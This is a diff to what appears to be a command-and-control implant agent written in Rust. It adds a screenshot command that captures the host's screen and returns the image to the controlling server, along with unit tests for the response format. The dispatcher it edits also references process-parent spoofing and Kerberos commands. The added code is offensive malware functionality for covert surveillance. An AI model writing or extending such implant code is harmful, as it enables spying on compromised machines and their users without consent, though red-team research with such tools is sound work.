@@ -135,6 +135,7 @@ pub fn dispatch(
         DemonCommand::CommandProcPpidSpoof => handle_proc_ppid_spoof(&package.payload, config),
         DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
         DemonCommand::CommandConfig => handle_config(&package.payload, config),
+        DemonCommand::CommandScreenshot => handle_screenshot(),
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
@@ -3453,6 +3454,31 @@ fn write_string_le(buf: &mut Vec<u8>, s: &str) {
     write_bytes_le(buf, &data);
 }
 
+// ─── COMMAND_SCREENSHOT (2510) ──────────────────────────────────────────────
+
+/// Handle a `CommandScreenshot` task: capture the screen and return BMP bytes.
+///
+/// The screenshot command takes no arguments from the server.
+///
+/// Outgoing payload (LE): `[success: u32][image_len: u32][image_bytes…]`
+///
+/// On success, `success = 1` and `image_bytes` contains a 24-bit BMP file.
+/// On failure (unsupported platform or GDI error), `success = 0`.
+fn handle_screenshot() -> DispatchResult {
+    let bmp = crate::platform::capture_screenshot();
+    let mut out = Vec::new();
+    match bmp {
+        Some(data) if !data.is_empty() => {
+            write_u32_le(&mut out, 1); // success
+            write_bytes_le(&mut out, &data);
+        }
+        _ => {
+            write_u32_le(&mut out, 0); // failure
+        }
+    }
+    DispatchResult::Respond(Response::new(DemonCommand::CommandScreenshot, out))
+}
+
 // ─── Payload parsing helpers (server → agent, little-endian) ─────────────────
 
 /// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
@@ -6462,5 +6488,64 @@ mod tests {
         assert!(config.verbose);
         let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
+    }
+
+    // ── CommandScreenshot (2510) ────────────────────────────────────────────
+
+    #[test]
+    fn screenshot_returns_respond_with_correct_command_id() {
+        let result = handle_screenshot();
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
+    }
+
+    #[test]
+    fn screenshot_response_starts_with_success_flag() {
+        let result = handle_screenshot();
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        // On non-Windows (CI) the stub returns None → success=0.
+        // On Windows the GDI call should succeed → success=1.
+        assert!(resp.payload.len() >= 4, "payload must contain at least the success flag");
+        let success = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
+        if cfg!(windows) {
+            assert_eq!(success, 1, "screenshot must succeed on Windows");
+            // Verify the image bytes are present after the success flag.
+            assert!(resp.payload.len() > 8, "payload must contain image data");
+            let img_len = u32::from_le_bytes(resp.payload[4..8].try_into().unwrap());
+            assert!(img_len > 0, "image length must be non-zero");
+            assert_eq!(
+                resp.payload.len(),
+                8 + img_len as usize,
+                "payload length must match header + image bytes"
+            );
+            // BMP magic: first two bytes of image data should be 'BM'.
+            assert_eq!(resp.payload[8], b'B', "BMP magic byte 0");
+            assert_eq!(resp.payload[9], b'M', "BMP magic byte 1");
+        } else {
+            assert_eq!(success, 0, "screenshot must fail on non-Windows stub");
+            assert_eq!(resp.payload.len(), 4, "failure payload is just the flag");
+        }
+    }
+
+    #[test]
+    fn screenshot_dispatch_routes_correctly() {
+        let pkg = DemonPackage {
+            command_id: u32::from(DemonCommand::CommandScreenshot),
+            request_id: 99,
+            payload: Vec::new(),
+        };
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::default();
+        let mut mem_files = MemFileStore::new();
+        let result = dispatch(&pkg, &mut config, &mut vault, &mut downloads, &mut mem_files);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
     }
 }
